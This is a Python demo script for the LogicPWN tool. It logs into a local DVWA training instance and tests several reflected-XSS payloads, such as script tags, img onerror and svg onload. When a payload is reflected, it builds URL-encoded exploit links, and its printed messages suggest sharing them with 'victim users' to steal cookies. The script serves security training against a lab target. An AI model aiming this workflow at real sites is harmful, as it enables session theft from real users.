#!/usr/bin/env python3
"""
LogicPWN DVWA XSS Quick Demo
This example demonstrates the XSS testing workflow you described:
1. Reflected XSS with exploit URL generation
2. Basic payload testing and URL encoding

Based on your example:
http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%27Reflected+XSS%27%29%3C%2Fscript%3E#
"""

import asyncio
import urllib.parse
import re
from logicpwn.core.runner import AsyncRequestRunner

async def quick_dvwa_login():
    """Quick login to DVWA"""
    print("🔐 Quick DVWA login...")
    
    async with AsyncRequestRunner() as runner:
        try:
            # Get login page
            response = await runner.send_request("http://localhost:8080/login.php")
            
            # Extract CSRF token if present
            csrf_token = None
            token_match = re.search(r'user_token["\']?\s*value=["\']([^"\']+)', response.body)
            if token_match:
                csrf_token = token_match.group(1)
            
            # Login
            login_data = {"username": "admin", "password": "admin", "Login": "Login"}
            if csrf_token:
                login_data["user_token"] = csrf_token
            
            login_response = await runner.send_request(
                "http://localhost:8080/login.php", method="POST", data=login_data
            )
            
            # Get session cookie
            set_cookie = login_response.headers.get("Set-Cookie", "")
            cookie_match = re.search(r'PHPSESSID=([^;]+)', set_cookie)
            return cookie_match.group(1) if cookie_match else None
            
        except Exception as e:
            print(f"Login error: {e}")
            return None

async def demonstrate_reflected_xss():
    """Demonstrate reflected XSS exactly like your example"""
    print("🎯 LogicPWN DVWA Reflected XSS Demo")
    print("=" * 50)
    
    # Login first
    session_cookie = await quick_dvwa_login()
    if not session_cookie:
        print("❌ Cannot login to DVWA")
        return
    
    print("✅ Logged into DVWA successfully")
    
    # Test the exact payload from your example
    payload = "<script>alert('Reflected XSS')</script>"
    print(f"\n🚨 Testing payload: {payload}")
    
    async with AsyncRequestRunner() as runner:
        headers = {"Cookie": f"PHPSESSID={session_cookie}"}
        
        # Send the XSS payload
        xss_url = "http://localhost:8080/vulnerabilities/xss_r/"
        response = await runner.send_request(
            xss_url,
            method="GET", 
            params={"name": payload},
            headers=headers
        )
        
        if response.status_code == 200:
            print(f"✅ Request successful: {response.status_code}")
            
            # Check if payload is reflected
            if payload in response.body:
                print("🚨 PAYLOAD REFLECTED IN RESPONSE!")
                print("   This indicates a reflected XSS vulnerability")
                
                # Generate the exploit URL (like your example)
                encoded_payload = urllib.parse.quote(payload)
                exploit_url = f"{xss_url}?name={encoded_payload}"
                
                print(f"\n🔗 Generated Exploit URL:")
                print(f"   {exploit_url}")
                print(f"\n📋 URL-encoded payload: {encoded_payload}")
                
                # Show how this matches your example format
                print(f"\n💡 This is similar to your example:")
                print(f"   http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3E...")
                
                print(f"\n⚠️  Impact:")
                print(f"   • Share this URL with victim users")
                print(f"   • When opened, JavaScript executes in their browser")
                print(f"   • Can steal cookies, redirect, or perform actions")
                
            else:
                print("🛡️  Payload not found - might be filtered/encoded")
                
            # Check for encoding
            if "&lt;script" in response.body:
                print("🛡️  Payload appears to be HTML encoded")
            elif "script" in response.body.lower():
                print("⚠️  Script tags found but may be partially filtered")
                
        else:
            print(f"❌ Request failed: {response.status_code}")

async def test_multiple_xss_payloads():
    """Test multiple XSS payloads like in your examples"""
    print("\n🎯 Testing Multiple XSS Payloads")
    print("=" * 40)
    
    session_cookie = await quick_dvwa_login()
    if not session_cookie:
        return
    
    # Various XSS payloads to test
    payloads = [
        "<script>alert('Reflected XSS')</script>",  # Your example
        "<script>prompt('Stored XSS')</script>",     # Stored XSS example
        "<script>alert('DOM XSS')</script>",         # DOM XSS example
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')"
    ]
    
    async with AsyncRequestRunner() as runner:
        headers = {"Cookie": f"PHPSESSID={session_cookie}"}
        xss_url = "http://localhost:8080/vulnerabilities/xss_r/"
        
        vulnerable_payloads = []
        
        for i, payload in enumerate(payloads, 1):
            print(f"\n{i}. Testing: {payload}")
            
            response = await runner.send_request(
                xss_url, method="GET", params={"name": payload}, headers=headers
            )
            
            if response.status_code == 200 and payload in response.body:
                print(f"   🚨 VULNERABLE! Payload reflected")
                vulnerable_payloads.append(payload)
                
                # Generate exploit URL
                encoded = urllib.parse.quote(payload)
                exploit_url = f"{xss_url}?name={encoded}"
                print(f"   🔗 Exploit: {exploit_url[:80]}...")
                
            else:
                print(f"   🛡️  Protected or filtered")
        
        print(f"\n📊 Results: {len(vulnerable_payloads)}/{len(payloads)} payloads successful")
        
        if vulnerable_payloads:
            print(f"\n🎉 Reflected XSS vulnerability confirmed!")
            print(f"💡 Use exploit URLs to demonstrate XSS to victims")

async def main():
    """Run the XSS demonstration"""
    print("🎯 LogicPWN DVWA XSS Quick Demo")
    print("Recreating your XSS testing examples with LogicPWN")
    print("=" * 60)
    
    # Check DVWA
    async with AsyncRequestRunner() as runner:
        try:
            response = await runner.send_request("http://localhost:8080")
            if response.status_code != 200:
                print("❌ DVWA not accessible. Run: docker run -d -p 8080:80 vulnerables/web-dvwa:latest")
                return
        except Exception as e:
            print(f"❌ Cannot connect to DVWA: {e}")
            return
    
    print("✅ DVWA accessible - starting XSS demo")
    
    # Run the demonstrations
    await demonstrate_reflected_xss()
    await test_multiple_xss_payloads()
    
    print(f"\n🎉 XSS demo completed!")
    print(f"\nYour workflow recreated with LogicPWN:")
    print(f"1. ✅ Login to DVWA")
    print(f"2. ✅ Send XSS payloads")  
    print(f"3. ✅ Generate exploit URLs")
    print(f"4. ✅ Verify vulnerabilities")

if __name__ == "__main__":
    asyncio.run(main())
